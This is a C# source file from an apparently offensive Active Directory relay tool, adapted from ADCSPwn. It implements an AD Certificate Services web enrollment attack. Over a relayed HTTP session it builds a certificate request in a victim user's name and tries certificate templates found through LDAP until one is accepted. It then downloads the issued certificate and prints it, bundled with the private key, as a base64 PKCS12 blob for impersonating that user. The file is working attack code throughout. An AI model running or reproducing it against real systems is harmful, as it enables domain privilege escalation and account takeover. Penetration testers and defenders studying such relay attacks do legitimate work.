using Org.BouncyCastle.Asn1;
using Org.BouncyCastle.Asn1.Pkcs;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.OpenSsl;
using Org.BouncyCastle.Pkcs;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.X509;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;

namespace KrbRelay.Clients.Attacks.Http
{
    internal class ADCS
    {
        // https://github.com/bats3c/ADCSPwn

        public static void requestCertificate(HttpClient httpClient, string user, string domain, string template = null)
        {
            HttpResponseMessage result;

            // generate a rsa public-private key pair
            var random = new SecureRandom();
            var keyGenerationParameters = new KeyGenerationParameters(random, 4096);
            RsaKeyPairGenerator generator = new RsaKeyPairGenerator();
            generator.Init(keyGenerationParameters);
            var keyPair = generator.GenerateKeyPair();

            // set the attributes of the cert
            var cert_attribs = new Dictionary<DerObjectIdentifier, string>
            {
                {
                    X509Name.CN, string.Format("{0}\\{1}", domain, user)
                }
            };

            var subject = new X509Name(cert_attribs.Keys.ToList(), cert_attribs);

            // generate the CSR
            var pkcs10CertificationRequest = new Pkcs10CertificationRequest(PkcsObjectIdentifiers.Sha256WithRsaEncryption.Id, subject, keyPair.Public, null, keyPair.Private);
            var csr = Convert.ToBase64String(pkcs10CertificationRequest.GetEncoded());

            // correctly format the certificate
            var formatted_csr = "";
            formatted_csr += "-----BEGIN CERTIFICATE REQUEST-----";
            formatted_csr += csr;
            formatted_csr += "-----END CERTIFICATE REQUEST-----";
            formatted_csr = formatted_csr.Replace("\n", "").Replace("+", "%2b").Replace(" ", "+");

            Console.WriteLine("[*] Requesting a certificate");
            Stream dataStream = null;
            StreamReader reader = null;
            bool found_template = false;
            string responseFromServer = null;

            string[] CertificateTemplates;
            if (string.IsNullOrEmpty(template))
                CertificateTemplates = templateHunter();
            else
                CertificateTemplates = new string[] { template };

            string pattern = @"location=""certnew.cer\?ReqID=(.*?)&";
            Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase);
            string reqid = null;
            for (int i = 0; i < CertificateTemplates.Length; i++)
            {
                Console.WriteLine("[*] Testing: {0}", CertificateTemplates);
                if (CertificateTemplates[i] != null)
                {
                    // build the post request body
                    var data = "";
                    data += "Mode=newreq&CertRequest=";
                    data += formatted_csr;
                    data += "&CertAttrib=CertificateTemplate:";
                    data += CertificateTemplates[i];
                    data += "&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=";

                    using (var message = new HttpRequestMessage(HttpMethod.Post, "certsrv/certfnsh.asp"))
                    {
                        message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
                        message.Content = new StringContent(data, Encoding.UTF8, "application/x-www-form-urlencoded");
                        message.Method = HttpMethod.Post;
                        result = httpClient.SendAsync(message).Result;
                    }

                    if (result.StatusCode == HttpStatusCode.OK)
                    {
                        dataStream = result.Content.ReadAsStreamAsync().Result;

                        reader = new StreamReader(dataStream);
                        responseFromServer = reader.ReadToEnd();

                        if (responseFromServer.Contains("locDenied"))
                        {
                            continue;
                        }
                        //var match = rgx.Match(responseFromServer);
                        //reqid = match.Groups[1].ToString();
                        //if(reqid.Length == 0)
                        //{
                        //    continue;
                        //}
                        else
                        {
                            found_template = true;
                            Console.WriteLine("[+] Found valid template: " + CertificateTemplates[i]);
                            break;
                        }
                    }
                }
            }

            if (!found_template)
            {
                Console.WriteLine("[-] Unable to find any usable templates");
                Environment.Exit(1);
            }

            // find the req id of the certificate
            var match = rgx.Match(responseFromServer);
            reqid = match.Groups[1].ToString();
            if (reqid.Length == 0)
            {
                Console.WriteLine("[-] Failed to find the certificate request id... dumping all page content.");
                Console.WriteLine(responseFromServer);
                Environment.Exit(1);
            }
            //reqid = "62";

            Console.WriteLine("[*] SUCCESS (ReqID: " + reqid + ")");
            Console.WriteLine("[*] Downloading certificate");
            using (var message = new HttpRequestMessage(HttpMethod.Get, String.Format("certsrv/certnew.cer?ReqID={0}", reqid)))
            {
                message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
                result = httpClient.SendAsync(message).Result;
            }

            string certificate = null;
            using (dataStream = result.Content.ReadAsStreamAsync().Result)
            {
                reader = new StreamReader(dataStream);
                certificate = reader.ReadToEnd();
            }
            string errorPattern = @"<B> Error </B>";
            Regex errorRgx = new Regex(errorPattern, RegexOptions.IgnoreCase);
            if (errorRgx.Match(certificate).Success)
            {
                Console.WriteLine("[-] Failed to request certificate");
                Console.WriteLine(certificate);
                Environment.Exit(1);
                return;
            }

            Console.WriteLine("[*] Exporting certificate & private key");

            // bundle together certificate and the private key
            var privatekey = new StringWriter();
            var pemWriter = new PemWriter(privatekey);

            pemWriter.WriteObject(keyPair.Private);
            privatekey.Flush();
            privatekey.Close();
            var bundle = certificate + privatekey.ToString();

            using (TextReader sr = new StringReader(bundle))
            {
                IPasswordFinder passwordFinder = new PKCS12.PasswordStore("".ToCharArray());
                PemReader pemReader = new PemReader(sr);

                Pkcs12Store store = new Pkcs12StoreBuilder().Build();
                X509CertificateEntry[] chain = new X509CertificateEntry[1];
                AsymmetricCipherKeyPair privKey = null;

                object o;
                while ((o = pemReader.ReadObject()) != null)
                {
                    if (o is X509Certificate)
                    {
                        chain[0] = new X509CertificateEntry((X509Certificate)o);
                    }
                    else if (o is AsymmetricCipherKeyPair)
                    {
                        privKey = (AsymmetricCipherKeyPair)o;
                    }
                }

                store.SetKeyEntry("", new AsymmetricKeyEntry(privKey.Private), chain);
                var p12file = new MemoryStream();
                store.Save(p12file, "".ToCharArray(), new SecureRandom());
                p12file.Close();

                Console.WriteLine(Convert.ToBase64String(p12file.ToArray()));
            }
        }

        public static string[] templateHunter()
        {
            String Base = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,";
            DirectoryEntry DirEntry = null;
            DirectorySearcher DirSearch = null;

            String LdapBase = Base + Program.domainDN;
            DirEntry = new DirectoryEntry(LdapBase);
            DirSearch = new DirectorySearcher(DirEntry);

            DirSearch.Filter = "(&(name=*))";
            DirSearch.PageSize = Int32.MaxValue;

            var Templates = new List<string>() { };
            foreach (SearchResult Result in DirSearch.FindAll())
            {
                try
                {
                    Templates.Add(Result.Properties["name"][0].ToString());
                }
                catch (Exception ex)
                { }
            }

            return Templates.ToArray();
        }
    }

    // https://github.com/bats3c/ADCSPwn/blob/master/ADCSPwn/PKCS12%20.cs
    internal class PKCS12
    {
        public class PasswordStore : IPasswordFinder
        {
            private char[] password;

            public PasswordStore(
                        char[] password)
            {
                this.password = password;
            }

            public char[] GetPassword()
            {
                return (char[])password.Clone();
            }
        }
    }
}